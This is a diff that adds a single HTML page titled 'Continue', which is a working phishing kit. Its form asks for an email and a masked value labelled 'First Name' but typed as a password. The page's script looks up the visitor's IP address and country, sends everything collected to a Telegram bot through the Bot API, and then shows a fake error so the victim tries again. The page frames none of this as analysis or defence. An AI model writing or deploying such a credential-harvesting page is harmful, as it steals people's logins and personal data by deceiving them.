@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Continue</title>
+
+<style>
+    html, body {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        font-family: Arial, sans-serif;
+    }
+
+    body {
+        background: url('background.png') no-repeat center center fixed;
+        background-size: cover;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+
+    .form-box {
+        background: rgba(0, 0, 0, 0.65);
+        padding: 25px;
+        width: 90%;
+        max-width: 400px;
+        border-radius: 10px;
+        color: #fff;
+    }
+
+    input, button {
+        width: 100%;
+        padding: 12px;
+        margin-top: 10px;
+        border: none;
+        border-radius: 5px;
+        font-size: 16px;
+    }
+
+    input {
+        background: #fff;
+        color: #000;
+    }
+
+    button {
+        background: #28a745;
+        color: #fff;
+        cursor: pointer;
+    }
+
+    button:hover {
+        background: #218838;
+    }
+
+    .warning {
+        margin-top: 12px;
+        color: #ff3b3b;
+        font-size: 14px;
+        text-align: center;
+        display: none;
+    }
+</style>
+</head>
+
+<body>
+
+<div class="form-box">
+    <h2 style="text-align:center;">Continue</h2>
+
+    <form id="dataForm">
+        <input type="email" id="email" placeholder="Email Address" required>
+        <input type="password" id="fname" placeholder="First Name" required>
+        <button type="submit">Continue</button>
+        <div class="warning" id="warningMsg">
+            Cant continue this time try again
+        </div>
+    </form>
+</div>
+
+<script>
+const telegramBotToken = "YOUR_BOT_TOKEN";
+const telegramChatId = "YOUR_CHAT_ID";
+
+function getDeviceType() {
+    const ua = navigator.userAgent;
+    if (/mobile/i.test(ua)) return "Mobile";
+    if (/tablet/i.test(ua)) return "Tablet";
+    return "Desktop";
+}
+
+document.getElementById("dataForm").addEventListener("submit", async function(e) {
+    e.preventDefault();
+
+    const fname = document.getElementById("fname").value;
+    const email = document.getElementById("email").value;
+    const device = navigator.userAgent;
+    const deviceType = getDeviceType();
+    const warning = document.getElementById("warningMsg");
+
+    let ip = "Unknown";
+    let country = "Unknown";
+
+    try {
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+        ip = data.ip;
+        country = data.country_name;
+    } catch {}
+
+    const message = `
+📥 New Submission
+👤 Name: ${fname}
+📧 Email: ${email}
+🖥 Device Type: ${deviceType}
+📱 Device: ${device}
+🌍 IP: ${ip}
+🏳 Country: ${country}
+    `;
+
+    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: telegramChatId,
+            text: message
+        })
+    }).finally(() => {
+        warning.style.display = "block";
+    });
+});
+</script>
+
+</body>
+</html>
